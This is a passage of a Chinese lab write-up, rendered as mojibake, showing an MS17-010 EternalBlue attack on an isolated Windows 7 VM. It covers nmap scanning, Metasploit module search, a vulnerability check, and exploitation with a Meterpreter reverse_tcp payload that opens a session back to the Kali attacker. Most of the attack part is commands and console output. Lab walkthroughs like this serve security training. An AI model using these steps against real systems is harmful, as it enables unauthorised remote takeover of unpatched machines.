µã€ä½¿ç”¨å…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼ˆIPSï¼‰ã€æœ€å°åŒ–ç½‘ç»œæš´éœ² ç¯å¢ƒé…ç½® è™šæ‹Ÿç¯å¢ƒï¼šVMware Workstation 17 Pro - 17.0.0 build-20800274 é¶æœºï¼š ç³»ç»Ÿï¼šWindows 7 Enterprise x64 CPUï¼š11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz) ç½‘ç»œï¼šLANï¼ˆIPv4:10.0.0.17/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULLï¼‰ æ”»å‡»æœºï¼š ç³»ç»Ÿï¼šLinux kali 6.12.25-amd64 CPUï¼š11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz) ç½‘ç»œï¼šLANï¼ˆIPv4:10.0.0.223/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULLï¼‰ å®è·µæ­¥éª¤ éš”ç¦»ç½‘ç»œç¯å¢ƒé…ç½®ä¸ç«¯å£æ‰«æ ä¸€ã€åœ¨ VMware ä¸­åˆ›å»ºå¹¶åˆ†é… LAN åŒºæ®µï¼ˆå¯¹ Kali å’Œ Win7 æ‰§è¡Œç›¸åŒæ“ä½œï¼‰ï¼š æ‰“å¼€è®¾ç½®ï¼ˆSettingï¼‰ -\u0026gt; é€‰æ‹©ç½‘ç»œé€‚é…å™¨ï¼ˆNetwork Adapterï¼‰ -\u0026gt; å³ä¾§ç‚¹å‡»LANåŒºæ®µï¼ˆLAN Segmentï¼‰å•é€‰æ¡† -\u0026gt; ç‚¹å‡»ä¸‹æ–¹â€œLANåŒºæ®µ\u0026hellip;â€æŒ‰é’® -\u0026gt; åœ¨å¼¹å‡ºçš„çª—å£ä¸­ç‚¹å‡»æ·»åŠ ï¼ˆAddï¼‰ -\u0026gt; è¾“å…¥åç§°**â€œMS17-010_Experimentâ€** -\u0026gt; ç‚¹å‡»ç¡®å®š -\u0026gt; åœ¨ä¸‹æ‹‰èœå•ä¸­é€‰ä¸­åˆšåˆšåˆ›å»ºçš„LANåŒºæ®µ -\u0026gt; ç‚¹å‡»ç¡®å®š\näºŒã€é…ç½® Win7 çš„é™æ€IPå¹¶å…³é—­é˜²ç«å¢™ è¿›å…¥Win7 -\u0026gt; æ‰“å¼€æ§åˆ¶é¢æ¿ -\u0026gt; ç½‘ç»œå’Œ Internet -\u0026gt; ç½‘ç»œå’Œå…±äº«ä¸­å¿ƒ -\u0026gt; æ›´æ”¹é€‚é…å™¨è®¾ç½® -\u0026gt; å³é”®ç‚¹å‡»æœ¬åœ°è¿æ¥ -\u0026gt; å±æ€§ -\u0026gt; åŒå‡»Internet åè®®ç‰ˆæœ¬4ï¼ˆTCP/IPv4ï¼‰ -\u0026gt; é€‰æ‹©ä½¿ç”¨é™æ€IPåœ°å€ï¼ˆIPåœ°å€ï¼š10.0.0.17 | å­ç½‘æ©ç ï¼š255.255.255.0 | é»˜è®¤ç½‘å…³ï¼šç©ºï¼‰ -\u0026gt; ç‚¹å‡»ç¡®å®šé€€å‡º -\u0026gt; åœ¨**â€œç½‘ç»œä¸å…±äº«ä¸­å¿ƒâ€ç‚¹å‡»Windowsé˜²ç«å¢™** -\u0026gt; é€‰æ‹©**â€œæ‰“å¼€æˆ–å…³é—­Windowsé˜²ç«å¢™â€** -\u0026gt; å…¨éƒ¨å…³é—­ï¼ˆPSï¼šæ²¡æ‰“è¡¥ä¸ä¸å…³é—­é˜²ç«å¢™ä¹Ÿèƒ½æˆåŠŸï¼‰\nä¸‰ã€é…ç½®Kaliçš„é™æ€IPåœ°å€å¹¶æµ‹è¯•äºŒè€…è¿é€šæ€§ æ‰“å¼€ç»ˆç«¯ -\u0026gt; ip addræŒ‡ä»¤æŸ¥çœ‹ç½‘å¡åç§°ï¼ˆé€šå¸¸ä¸ºeth0ï¼‰ -\u0026gt; æ‰‹åŠ¨åˆ†é…IPåœ°å€ï¼š\n1 2 3 sudo systemctl stop NetworkMaager # å…³é—­NetworkManageræœåŠ¡â€”â€”Kali é»˜è®¤è¿è¡ŒNetworkManageræœåŠ¡ã€‚å½“æ‰‹åŠ¨ä½¿ç”¨ipå‘½ä»¤ä¿®æ”¹æ¥å£çŠ¶æ€æ—¶ï¼ŒNetworkManagerä¼šæ£€æµ‹åˆ°æ¥å£é…ç½®å‘ç”Ÿäº†å˜åŒ–ã€‚å¦‚æœè¯¥æ¥å£è¢«å®ƒæ¥ç®¡ï¼Œå®ƒä¼šæ ¹æ®è‡ªå·±çš„é…ç½®æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯DHCPæˆ–â€œè‡ªåŠ¨è¿æ¥â€ï¼‰ç«‹å³é‡ç½®æ¥å£ï¼Œä»è€ŒæŠ¹æ‰åˆšåˆšæ‰‹åŠ¨æ·»åŠ çš„IPåœ°å€ sudo ip addr add 10.0.0.223/24 dev eth0 # å°†IPåœ°å€10.0.0.223åˆ†é…ç»™eth0ç½‘å¡ sudo ip link set eth0 up # æ¿€æ´»eth0ç½‘å¡ï¼Œè®©å®ƒå¼€å§‹å·¥ä½œ -\u0026gt; å†æ¬¡è¾“å…¥ip addréªŒè¯eth0çš„IPåœ°å€ -\u0026gt; æµ‹è¯•ä¸¤è€…è¿é€šæ€§å¹¶è¿›è¡ŒNampæ‰«æï¼š\n1 2 ping 10.0.0.17 -c 4 # åªå‘é€4ä¸ªæ•°æ®åŒ… nmap -n -sV -sC -T4 10.0.0.17 # ä¸è¿›è¡ŒDNSè§£æï¼Œä½¿ç”¨é»˜è®¤çš„Nmapè„šæœ¬æ¢æµ‹æœåŠ¡/ç‰ˆæœ¬ä¿¡æ¯ å››ã€Nmapæ‰«æç»“æœåˆ†æ ä¸Šè¿°Nmapæ‰«æç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -n -sV -sC -T4 10.0.0.17 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 02:51 UTC Nmap scan report for 10.0.0.17 Host is up (0.00047s latency). Not shown: 991 closed tcp ports (reset) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Enterprise 7600 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC MAC Address: 00:0C:29:10:6D:B7 (VMware) Service Info: Host: ANKH-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows 7 Enterprise 7600 (Windows 7 Enterprise 6.1) | OS CPE: cpe:/o:microsoft:windows_7::- | Computer name: Ankh-PC | NetBIOS computer name: ANKH-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2025-12-31T10:52:28+08:00 |_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s |_nbstat: NetBIOS name: ANKH-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:0c:29:10:6d:b7 (VMware) | smb2-time: | date: 2025-12-31T02:52:28 |_ start_date: 2025-12-31T02:41:52 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.41 seconds é¶æœºä¿¡æ¯\nIPåœ°å€ï¼š10.0.0.17\nä¸»æœºçŠ¶æ€ï¼šåœ¨çº¿ï¼ˆå»¶è¿Ÿ 0.00047sï¼‰\næ“ä½œç³»ç»Ÿï¼šWindows 7 Enterprise 7600 (ç‰ˆæœ¬ 6.1)\nä¸»æœºåï¼šANKH-PC\nå·¥ä½œç»„ï¼šWORKGROUP\nMACåœ°å€ï¼š00:0C:29:10:6D:B7 (VMware è™šæ‹Ÿæœº)\nç³»ç»Ÿæ—¶é—´ï¼šUTC+8 (åŒ—äº¬æ—¶é—´)\nå¼€æ”¾ç«¯å£ä¸æœåŠ¡\n135/tcp - Microsoft Windows RPC (MSRPC)\n139/tcp - Microsoft Windows NetBIOS-SSN\n445/tcp - Microsoft-DS (SMB)\nWindows 7 Enterprise 7600\nå·¥ä½œç¾¤ç»„ï¼šWORKGROUP\n49152-49157/tcp - Microsoft Windows RPC (MSRPC)\nSMBå®‰å…¨è¯„ä¼°\nèº«ä»½éªŒè¯çº§åˆ«ï¼šç”¨æˆ·çº§\næ¶ˆæ¯ç­¾åï¼šå·²å¯ç”¨ä½†éå¿…éœ€ï¼ˆé»˜è®¤é…ç½®ï¼‰\nç­¾åçŠ¶æ€ï¼šå·²ç¦ç”¨ï¼ˆå­˜åœ¨é£é™©ï¼Œä½†ä¸ºé»˜è®¤è®¾ç½®ï¼Œå¯èƒ½é¢ä¸´ä¸­é—´äººæ”»å‡»é£é™©ï¼‰\nå°è¯•è´¦æˆ·ï¼šguest\nMetasploitæ‰«æä¸æ¼æ´åˆ©ç”¨ ä¸€ã€å¯åŠ¨Metasploitæ¡†æ¶ï¼ˆrootï¼‰ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 â”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# msfconsole Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again +-------------------------------------------------------+ | METASPLOIT by Rapid7 | +---------------------------+---------------------------+ | __________________ | | | ==c(______(o(______(_() | |\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;|======[*** | | )=\\ | | EXPLOIT \\ | | // \\\\ | |_____________\\_______ | | // \\\\ | |==[msf \u0026gt;]============\\ | | // \\\\ | |______________________\\ | | // RECON \\\\ | \\(@)(@)(@)(@)(@)(@)(@)/ | | // \\\\ | ********************* | +---------------------------+---------------------------+ | o O o | \\\u0026#39;\\/\\/\\/\u0026#39;/ | | o O | )======( | | o | .\u0026#39; LOOT \u0026#39;. | | |^^^^^^^^^^^^^^|l___ | / _||__ \\ | | | PAYLOAD |\u0026#34;\u0026#34;\\___, | / (_||_ \\ | | |________________|__|)__| | | __||_) | | | |(@)(@)\u0026#34;\u0026#34;\u0026#34;**|(@)(@)**|(@) | \u0026#34; || \u0026#34; | | = = = = = = = = = = = = | \u0026#39;--------------\u0026#39; | +---------------------------+---------------------------+ =[ metasploit v6.4.69-dev ] + -- --=[ 2529 exploits - 1302 auxiliary - 432 post ] + -- --=[ 1672 payloads - 49 encoders - 13 nops ] + -- --=[ 9 evasion ] Metasploit Documentation: https://docs.metasploit.com/ msf6 \u0026gt; äºŒã€æœç´¢ms17-010ç›¸å…³æ¨¡å—ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 msf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 \\_ target: Automatic Target . . . . 2 \\_ target: Windows 7 . . . . 3 \\_ target: Windows Embedded Standard 7 . . . . 4 \\_ target: Windows Server 2008 R2 . . . . 5 \\_ target: Windows 8 . . . . 6 \\_ target: Windows 8.1 . . . . 7 \\_ target: Windows Server 2012 . . . . 8 \\_ target: Windows 10 Pro . . . . 9 \\_ target: Windows 10 Enterprise Evaluation . . . . 10 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 11 \\_ target: Automatic . . . . 12 \\_ target: PowerShell . . . . 13 \\_ target: Native upload . . . . 14 \\_ target: MOF upload . . . . 15 \\_ AKA: ETERNALSYNERGY . . . . 16 \\_ AKA: ETERNALROMANCE . . . . 17 \\_ AKA: ETERNALCHAMPION . . . . 18 \\_ AKA: ETERNALBLUE . . . . 19 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 20 \\_ AKA: ETERNALSYNERGY . . . . 21 \\_ AKA: ETERNALROMANCE . . . . 22 \\_ AKA: ETERNALCHAMPION . . . . 23 \\_ AKA: ETERNALBLUE . . . . 24 auxiliary/scanner/smb/smb_ms17_010 . normal No MS17-010 SMB RCE Detection 25 \\_ AKA: DOUBLEPULSAR . . . . 26 \\_ AKA: ETERNALBLUE . . . . 27 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution 28 \\_ target: Execute payload (x64) . . . . 29 \\_ target: Neutralize implant . . . . Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce After interacting with a module you can manually set a TARGET with set TARGET \u0026#39;Neutralize implant\u0026#39; msf6 \u0026gt; ä»¥ä¸Šä¸ºmetasploitä¸­çš„ms17-010ï¼ˆæ°¸æ’ä¹‹è“ï¼‰æ¨¡å—ã€‚\nMS17-010 (æ°¸æ’ä¹‹è“) æ¼æ´åˆ©ç”¨å¥—ä»¶è¯¦è§£\nä¸»è¦æ”»å‡»æ¨¡å—\na. exploit/windows/smb/ms17_010_eternalblue (ç´¢å¼• 0-9)\nä»‹ç»ï¼š è¿™æ˜¯æœ€è‘—åã€æœ€ç›´æ¥çš„æ”»å‡»æ¨¡å—ã€‚å®ƒåˆ©ç”¨SMBv1åè®®çš„å†…æ ¸çº§æ¼æ´ï¼Œé€šè¿‡è¶Šç•Œå†™å…¥ç ´åå†…æ ¸å†…å­˜æ± ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è¿‡ç¨‹ç›´æ¥åœ¨å†…æ ¸æ€è¿›è¡Œï¼Œæå…¶â€œæš´åŠ›â€ã€‚ æ¼æ´ç±»å‹ï¼š SMBåè®®è¿œç¨‹å†…æ ¸æ± ç ´åæ¼æ´ã€‚ åˆ©ç”¨æ–¹å¼ï¼š å‘é€ç‰¹åˆ¶SMBv1æ•°æ®åŒ…è§¦å‘å†…æ ¸å†…å­˜ç ´åã€‚ ç›®æ ‡ç³»ç»Ÿï¼š Windows 7 / Server 2008 R2ï¼ˆä¸»è¦ç›®æ ‡ï¼‰ Windows 8/8.1 / Server 2012 Windows 10 Pro/Enterprise ç‰¹ç‚¹ï¼š æ— éœ€ä»»ä½•èº«ä»½éªŒè¯ã€‚ å¯¹Windows 7/2008 R2æˆåŠŸç‡è¾ƒé«˜ã€‚ æ“ä½œé£é™©é«˜ï¼šç”±äºç›´æ¥æ“ä½œå†…æ ¸å†…å­˜ï¼Œè‹¥å †å–·å°„å¤±è´¥ï¼Œææ˜“å¯¼è‡´ç›®æ ‡ç³»ç»Ÿè“å±æ­»æœº(BSOD)ã€‚ ä¾èµ–ç›®æ ‡å¼€å¯445ç«¯å£ã€‚ å…³é”®å‚æ•°ï¼š GroomAllocationsã€‚è°ƒæ•´æ­¤å†…å­˜åˆ†é…å‚æ•°æœ‰æ—¶èƒ½åœ¨æ”»å‡»å¤±è´¥æ—¶æé«˜æˆåŠŸç‡ã€‚ b. exploit/windows/smb/ms17_010_psexec (ç´¢å¼• 10-18)\nä»‹ç»ï¼š æ­¤æ¨¡å—ä¸ä¸€å®šéœ€è¦å‡­è¯ã€‚å®ƒä¸»è¦åˆ©ç”¨EternalRomanceç­‰æ¼æ´é“¾ï¼Œé€šè¿‡SMBå‘½åç®¡é“ä¸­çš„ç±»å‹æ··æ·†æ¼æ´è¿›è¡Œæ”»å‡»ã€‚ç›¸æ¯”EternalBlueæ›´ç¨³å®šï¼Œæ˜¯æ”»å‡»æ›´æ–°ç³»ç»Ÿï¼ˆå¦‚Win10ï¼‰çš„é¦–é€‰ã€‚ æŠ€æœ¯é›†åˆï¼š èåˆäº†å¤šä¸ªSMBæ¼æ´ï¼ŒåŒ…æ‹¬EternalRomanceã€EternalSynergyã€EternalChampionã€‚ ç›®æ ‡ç±»å‹ï¼š PowerShellï¼š é€šè¿‡PowerShellåœ¨å†…å­˜ä¸­æ‰§è¡Œè½½è·ã€‚ Native uploadï¼š ç›´æ¥ä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶æ‰§è¡Œã€‚ MOF uploadï¼š ä½¿ç”¨WMIæ‰˜ç®¡å¯¹è±¡æ ¼å¼æ‰§è¡Œã€‚ ä¼˜ç‚¹ï¼š æ¯”EternalBlueæ›´ç¨³å®šï¼Œå‡ ä¹ä¸ä¼šå¯¼è‡´è“å±ã€‚ æ”¯æŒå¤šç§è½½è·ä¼ è¾“å’Œæ‰§è¡Œæ–¹å¼ã€‚ å¦‚æœæ‹¥æœ‰æœ‰æ•ˆçš„SMBå‡­è¯ï¼ˆå³ä½¿æ˜¯æ™®é€šç”¨æˆ·ï¼‰ï¼ŒæˆåŠŸç‡æ¥è¿‘100%ã€‚ è¾…åŠ©æ¨¡å—\na. auxiliary/scanner/smb/smb_ms17_010 (ç´¢å¼• 24-26)\nä»‹ç»ï¼š æ”»å‡»å‰å¿…å¤‡çš„ä¾¦å¯Ÿæ¨¡å—ã€‚ç”¨äºå®‰å…¨åœ°æ£€æµ‹ç›®æ ‡ä¸»æœºæ˜¯å¦å­˜åœ¨MS17-010æ¼æ´ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦å·²è¢«æ¤å…¥DoublePulsaråé—¨ã€‚ åŠŸèƒ½ï¼š æ£€æµ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨MS17-010æ¼æ´ã€‚ æ£€æµ‹ç›®æ ‡æ˜¯å¦å·²æ„ŸæŸ“DoublePulsaråé—¨ã€‚ è¾“å‡ºè§£è¯»ï¼š VULNERABLEï¼š ç›®æ ‡å­˜åœ¨æ¼æ´ï¼Œå¯å°è¯•æ”»å‡»ã€‚ DoublePulsar detectedï¼š ç›®æ ‡å·²è¢«æ”»ç ´ï¼Œå†…å­˜ä¸­é©»ç•™æœ‰åé—¨ã€‚ ç‰¹ç‚¹ï¼š éå…¥ä¾µæ€§ï¼Œä»…ç”¨äºä¿¡æ¯æ”¶é›†ã€‚ æ”¯æŒæ‰«ææ•´ä¸ªç½‘æ®µï¼ˆset RHOSTS 192.168.1.0/24ï¼‰ã€‚ b. auxiliary/admin/smb/ms17_010_command (ç´¢å¼• 19-23)\nä»‹ç»ï¼š ä¸€ä¸ªè½»é‡çº§çš„å‘½ä»¤æ‰§è¡Œæ¨¡å—ã€‚ä¸è¿”å›äº¤äº’å¼Shellï¼Œä»…æ‰§è¡Œå•æ¡ç³»ç»Ÿå‘½ä»¤å¹¶è¿”å›ç»“æœã€‚é€‚ç”¨äºå¿«é€Ÿã€éšè”½çš„ä»»åŠ¡ã€‚\nåŠŸèƒ½ï¼š åœ¨å·²ç¡®è®¤å­˜åœ¨æ¼æ´æˆ–å·²è¢«æ§çš„ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚\nç”¨é€”ï¼š\nåæ¸—é€é˜¶æ®µå¿«é€Ÿæ‰§è¡Œå‘½ä»¤ï¼ˆå¦‚whoamiã€æ·»åŠ ç”¨æˆ·ï¼‰ã€‚ åœ¨ä¸å»ºç«‹æŒä¹…è¿æ¥çš„æƒ…å†µä¸‹è¿›è¡Œæ“ä½œã€‚ åŒæ ·æ”¯æŒEternalRomanceç­‰å¤šç§åˆ©ç”¨æ–¹å¼ã€‚ åé—¨åˆ©ç”¨æ¨¡å—\nexploit/windows/smb/smb_doublepulsar_rce (ç´¢å¼• 27-29)\nDoublePulsaræ˜¯ä»€ä¹ˆï¼š ä¸€ä¸ªéšè”½çš„ã€æ— æ–‡ä»¶è½åœ°çš„å†…å­˜SMBåé—¨ï¼Œé€šå¸¸ç”±EternalBlueæ”»å‡»æˆåŠŸåæ¤å…¥ã€‚\næ ¸å¿ƒåŠŸèƒ½ï¼š\nExecute payloadï¼š è‹¥å‘ç°ç›®æ ‡å·²å­˜åœ¨DoublePulsaråé—¨ï¼Œå¯ç›´æ¥é€šè¿‡æ­¤åé—¨æ³¨å…¥DLLæˆ–æ‰§è¡Œä»£ç ï¼Œæ— éœ€å†æ¬¡è§¦å‘åŸå§‹æ¼æ´ã€‚ Neutralize implantï¼š åœ¨æ¸—é€æµ‹è¯•ç»“æŸåï¼Œä¸“ä¸šåœ°æ¸…é™¤å†…å­˜ä¸­çš„åé—¨ç—•è¿¹ã€‚ ç›®æ ‡é€‰é¡¹ï¼š\næ³¨å…¥è½½è·ï¼š åˆ©ç”¨ç°æœ‰åé—¨æ‰§è¡Œä»£ç ã€‚ æ¸…é™¤åé—¨ï¼š å¸è½½DoublePulsaræ¤å…¥ç‰©ã€‚ é«˜çº§é…ç½®é€‰é¡¹ï¼ˆé€šç”¨ï¼‰\nè¿™äº›å‚æ•°åœ¨å¤šæ•°ç›¸å…³æ¨¡å—ä¸­é€šç”¨ï¼š\nRHOST / RHOSTSï¼š ç›®æ ‡IPåœ°å€æˆ–IPèŒƒå›´ï¼ˆå¦‚192.168.1.10æˆ–192.168.1.0/24ï¼‰ã€‚ RPORTï¼š SMBæœåŠ¡ç«¯å£ï¼Œé»˜è®¤ä¸º445ã€‚ SMBUser / SMBPassï¼š SMBç”¨æˆ·åå’Œå¯†ç ï¼ˆå¯¹äºpsexecæ¨¡å—å°¤å…¶é‡è¦ï¼‰ã€‚ VERIFY_ARCHï¼š æ˜¯å¦éªŒè¯ç›®æ ‡ç³»ç»Ÿæ¶æ„ï¼ˆ64ä½/32ä½ï¼‰ã€‚ VERIFY_TARGETï¼š æ˜¯å¦éªŒè¯ç›®æ ‡æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€‚ GroomAllocationsï¼š (EternalBlueä¸“ç”¨) è°ƒæ•´åˆå§‹å†…å­˜åˆ†é…è¯·æ±‚çš„æ•°é‡ï¼Œä»¥å½±å“å†…æ ¸å†…å­˜å¸ƒå±€ã€‚ ä¸‰ã€æ¢æµ‹ç›®æ ‡ä¸»æœº 1 2 3 4 5 6 7 8 9 msf6 \u0026gt; use 24 msf6 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; set rhost 10.0.0.17 rhost =\u0026gt; 10.0.0.17 msf6 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; run [+] 10.0.0.17:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit) /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator \u0026#39;+\u0026#39; and \u0026#39;?\u0026#39; was replaced with \u0026#39;*\u0026#39; in regular expression [*] 10.0.0.17:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; å…³é”®ä¿¡æ¯ï¼šHost is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit)\nå››ã€æ¼æ´åˆ©ç”¨ åˆ‡æ¢exploitæ¨¡å— -\u0026gt; è®¾ç½®é¶æœºIP -\u0026gt; è®¾ç½®æ”»å‡»æœºIP -\u0026gt; è®¾ç½®è½½è· -\u0026gt; æ£€å¯Ÿé…ç½®ä¿¡æ¯ -\u0026gt; run -\u0026gt; æƒé™éªŒè¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 msf6 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; use 0 [*] Using configured payload windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhost 10.0.0.17 rhost =\u0026gt; 10.0.0.17 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lhost 10.0.0.223 lhost =\u0026gt; 10.0.0.223 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set payload windows/x64/meterpreter/reverse_tcp payload =\u0026gt; windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.0.0.17 yes The target host(s), see https: //docs.metasploit.com/docs/usi ng-metasploit/basics/using-met asploit.html RPORT 445 yes The target port (TCP) SMBDomain no (Optional) The Windows domain to use for authentication. Onl y affects Windows Server 2008 R2, Windows 7, Windows Embedde d Standard 7 target machines. SMBPass no (Optional) The password for th e specified username SMBUser no (Optional) The username to aut henticate as VERIFY_ARCH true yes Check if remote architecture m atches exploit Target. Only af fects Windows Server 2008 R2, Windows 7, Windows Embedded St andard 7 target machines. VERIFY_TARGET true yes Check if remote OS matches exp loit Target. Only affects Wind ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 t arget machines. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 10.0.0.223 yes The listen address (an interface ma y be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target View the full module info with the info, or info -d command. PSï¼šæ¼æ´åˆ©ç”¨ï¼ˆExploitï¼‰åªæ˜¯æ‰“å¼€å¤§é—¨çš„â€œé’¥åŒ™â€ï¼Œè½½è·ï¼ˆPayloadï¼‰æ˜¯è¿›é—¨ä¹‹åè¦æ‰§è¡Œçš„ä»»åŠ¡ã€‚Metasploit å°†é»˜è®¤Payloadè®¾ç½®ä¸ºwindows/x64/meterpreter/reverse_tcpã€‚å…¶ä¸­windows/x64æŒ‡æ˜é¶æœºç³»ç»Ÿæ˜¯64ä½ windows ç³»ç»Ÿï¼›meterpreteræ˜¯ Metasploit çš„â€œç‹ç‰Œâ€è½½è·ï¼Œè¿è¡Œåœ¨å†…å­˜ä¸­ï¼Œä¸å†™å…¥ç¡¬ç›˜ï¼ˆéš¾ä»¥è¢«å¯Ÿè§‰ï¼‰ï¼Œä¸”æä¾›äº†æå…¶ä¸°å¯Œçš„å†…ç½®å‘½ä»¤ï¼ˆå¦‚ hashdump, screenshot, webcam_snapï¼‰ï¼Œè¿œæ¯”æ™®é€šçš„ CMD å‘½ä»¤è¡Œå¼ºå¤§ï¼›reverse_tcpæŒ‡æ˜ä½¿ç”¨åå‘TCPè¿æ¥ï¼Œç”¨äºç»•è¿‡é˜²ç«å¢™ï¼ŒåŒæ—¶ç¡®ä¿åœ¨å¤æ‚çš„ç½‘ç»œç¯å¢ƒä¸‹ï¼Œæ”»å‡»è½½è·èƒ½ç¨³å®šåœ°ä¼ è¾“å’Œé€šä¿¡ï¼Œä¸ä¼šè½»æ˜“æ–­å¼€è¿æ¥ã€‚\nPSï¼šè®¾ç½®åå‘è¿æ¥åï¼Œéœ€è¦æŒ‡å®šlhostå‚æ•°ï¼Œä»¥æŒ‡å®šé¶æœºå‡ºå‘æ¼æ´åèƒ½å¤ŸæˆåŠŸè¿æ¥å›æ”»å‡»æœº\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] Started reverse TCP handler on 10.0.0.223:4444 [*] 10.0.0.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.0.0.17:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit) [*] 10.0.0.17:445 - Scanned 1 of 1 hosts (100% complete) [+] 10.0.0.17:445 - The target is vulnerable. [*] 10.0.0.17:445 - Connecting to target for exploitation. [+] 10.0.0.17:445 - Connection established for exploitation. [+] 10.0.0.17:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.0.0.17:445 - CORE raw buffer dump (25 bytes) [*] 10.0.0.17:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70 Windows 7 Enterp [*] 10.0.0.17:445 - 0x00000010 72 69 73 65 20 37 36 30 30 rise 7600 [+] 10.0.0.17:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.0.0.17:445 - Trying exploit with 12 Groom Allocations. [*] 10.0.0.17:445 - Sending all but last fragment of exploit packet [*] 10.0.0.17:445 - Starting non-paged pool grooming [+] 10.0.0.17:445 - Sending SMBv2 buffers [+] 10.0.0.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.0.0.17:445 - Sending final SMBv2 buffers. [*] 10.0.0.17:445 - Sending last fragment of exploit packet! [*] 10.0.0.17:445 - Receiving response from exploit packet [+] 10.0.0.17:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.0.0.17:445 - Sending egg to corrupted connection. [*] 10.0.0.17:445 - Triggering free of corrupted buffer. [*] Sending stage (203846 bytes) to 10.0.0.17 [*] Meterpreter session 1 opened (10.0.0.223:4444 -\u0026gt; 10.0.0.17:49161) at 2025-12-31 